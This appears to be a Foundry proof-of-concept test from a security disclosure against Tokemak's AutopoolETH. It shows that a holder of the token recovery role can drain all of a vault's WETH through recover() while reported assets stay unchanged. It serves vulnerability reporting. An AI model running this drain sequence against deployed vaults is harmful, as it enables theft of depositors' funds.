// SPDX-License-Identifier: UNLICENSED
/// @title AUTOfinance / Tokemak - AutopoolETH.recover() drains the whole vault
/// Bug: the tracked-asset exclusion guard in Autopool4626.recover was
/// commented out in commit 9a19d48e (2024-05-28, "temporarily remove recover
/// restrictions") and never restored, so recover() transfers ANY token held
/// by the vault — including its own base asset — to an arbitrary destination.
/// Impact: the TOKEN_RECOVERY_MANAGER drains a vault holding
/// 100.0000000000001 WETH down to 0 WETH with two recover() calls. The vault
/// stays live and unpaused, the user keeps their shares, and totalAssets()
/// still reports the full amount (silent drain, stale NAV).
/// Severity: High
/// Affected: Tokemak v2-core-pub (scope repo commit de163d5a) —
/// AutopoolETH.recover() (src/vault/AutopoolETH.sol:777) calling
/// Autopool4626.recover() (src/vault/libs/Autopool4626.sol:145), whose
/// tracked-asset guard (L159-168) is commented out.
/// PoC: local Foundry test only, no live target.
pragma solidity 0.8.17;

import { Test } from "forge-std/Test.sol";
import { console } from "forge-std/console.sol";
import { Clones } from "openzeppelin-contracts/proxy/Clones.sol";
import { Roles } from "src/libs/Roles.sol";
import { Errors } from "src/utils/Errors.sol";
import { SystemRegistry } from "src/SystemRegistry.sol";
import { AccessController } from "src/security/AccessController.sol";
import { SystemSecurityL1 } from "src/security/SystemSecurityL1.sol";
import { AutopoolRegistry } from "src/vault/AutopoolRegistry.sol";
import { AutopoolETH } from "src/vault/AutopoolETH.sol";
import { ERC20 } from "openzeppelin-contracts/token/ERC20/ERC20.sol";

/// Minimal mintable ERC20 standing in for WETH / TOKE (same shape as the
/// scope repo's test/mocks/TestERC20.sol, inlined to avoid a test/ remapping).
contract MockERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) { }

    function mint(address account, uint256 amount) external {
        _mint(account, amount);
    }
}

contract AutopoolRecoverPoC is Test {
    MockERC20 internal weth;
    MockERC20 internal toke;
    SystemRegistry internal registry;
    AccessController internal accessController;
    SystemSecurityL1 internal security;
    AutopoolRegistry internal autopoolRegistry;
    AutopoolETH internal vault;

    address internal user = makeAddr("user");
    address internal attacker = makeAddr("attacker");
    address internal stranger = makeAddr("stranger");
    address internal strategy = makeAddr("strategy"); // never called on the deposit path

    uint256 internal constant INIT_DEPOSIT = 100_000; // AutopoolETH.WETH_INIT_DEPOSIT
    uint256 internal constant USER_DEPOSIT = 100 ether;

    function setUp() public {
        weth = new MockERC20("Mock WETH", "mWETH");
        toke = new MockERC20("Mock TOKE", "mTOKE");

        registry = new SystemRegistry(address(toke), address(weth));
        accessController = new AccessController(address(registry));
        registry.setAccessController(address(accessController));

        security = new SystemSecurityL1(registry);
        registry.setSystemSecurity(address(security));

        autopoolRegistry = new AutopoolRegistry(registry);
        registry.setAutopoolRegistry(address(autopoolRegistry));

        AutopoolETH template = new AutopoolETH(registry, address(weth));
        vault = AutopoolETH(Clones.clone(address(template)));

        // initialize() deposits INIT_DEPOSIT from the caller
        weth.mint(address(this), INIT_DEPOSIT);
        weth.approve(address(vault), INIT_DEPOSIT);
        vault.initialize(strategy, "tETH", "Tokemak tETH", "");

        // register the vault (realistic deployment state)
        accessController.grantRole(Roles.AUTO_POOL_REGISTRY_UPDATER, address(this));
        autopoolRegistry.addVault(address(vault));

        // user deposits 100 WETH
        weth.mint(user, USER_DEPOSIT);
        vm.startPrank(user);
        weth.approve(address(vault), USER_DEPOSIT);
        vault.deposit(USER_DEPOSIT, user);
        vm.stopPrank();
    }

    function test_SetUpState() public {
        assertEq(weth.balanceOf(address(vault)), USER_DEPOSIT + INIT_DEPOSIT, "vault WETH before");
        assertEq(vault.totalAssets(), USER_DEPOSIT + INIT_DEPOSIT, "totalAssets before");
        assertEq(vault.balanceOf(user), USER_DEPOSIT, "user shares");
        assertFalse(vault.isShutdown(), "not shutdown");
        assertFalse(vault.paused(), "not paused");
    }

    function test_RecoveryManagerDrainsWholeVault() public {
        accessController.grantRole(Roles.TOKEN_RECOVERY_MANAGER, attacker);
        assertTrue(accessController.hasRole(Roles.TOKEN_RECOVERY_MANAGER, attacker), "attacker has role");
        // attacker holds NO admin / manager role
        assertFalse(accessController.hasRole(accessController.DEFAULT_ADMIN_ROLE(), attacker), "attacker not admin");
        assertFalse(accessController.hasRole(Roles.AUTO_POOL_MANAGER, attacker), "attacker not manager");

        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = USER_DEPOSIT;
        address[] memory destinations = new address[](1);
        destinations[0] = attacker;

        // BEFORE: vault holds the user's 100 WETH + the 100,000 wei init deposit.
        console.log("BEFORE: vault WETH (wei):", weth.balanceOf(address(vault)));
        console.log("BEFORE: attacker WETH (wei):", weth.balanceOf(attacker));
        console.log("BEFORE: totalAssets (wei):", vault.totalAssets());

        // 1) drain the user's 100 WETH — the base asset, on a live unpaused vault
        vm.prank(attacker);
        vault.recover(tokens, amounts, destinations);

        assertEq(weth.balanceOf(address(vault)), INIT_DEPOSIT, "vault WETH after 1st recover");
        assertEq(weth.balanceOf(attacker), USER_DEPOSIT, "attacker WETH after 1st recover");
        console.log("AFTER 1st recover: vault WETH (wei):", weth.balanceOf(address(vault)));
        console.log("AFTER 1st recover: attacker WETH (wei):", weth.balanceOf(attacker));

        // 2) drain the remaining 100_000 wei init deposit too — 100% of vault WETH
        amounts[0] = INIT_DEPOSIT;
        vm.prank(attacker);
        vault.recover(tokens, amounts, destinations);

        assertEq(weth.balanceOf(address(vault)), 0, "vault WETH fully drained");
        assertEq(weth.balanceOf(attacker), USER_DEPOSIT + INIT_DEPOSIT, "attacker total drained");
        console.log("AFTER 2nd recover: vault WETH (wei):", weth.balanceOf(address(vault)));
        console.log("AFTER 2nd recover: attacker WETH (wei):", weth.balanceOf(attacker));
        console.log("AFTER 2nd recover: totalAssets (wei, stale):", vault.totalAssets());
        console.log("AFTER 2nd recover: vault paused:", vault.paused());
        console.log("AFTER 2nd recover: vault shutdown:", vault.isShutdown());

        // vault was never shut down / paused, and the user still holds shares
        assertFalse(vault.isShutdown(), "still not shutdown");
        assertFalse(vault.paused(), "still not paused");
        assertEq(vault.balanceOf(user), USER_DEPOSIT, "user shares untouched");

        // NOTE: totalAssets() is accounting-based (totalIdle) and recover() never
        // updates it, so it still reports the drained funds as present:
        assertEq(vault.totalAssets(), USER_DEPOSIT + INIT_DEPOSIT, "totalAssets stale after drain");
    }

    function test_NonRoleCallerReverts() public {
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = USER_DEPOSIT;
        address[] memory destinations = new address[](1);
        destinations[0] = stranger;

        vm.prank(stranger);
        vm.expectRevert(Errors.AccessDenied.selector);
        vault.recover(tokens, amounts, destinations);
    }
}
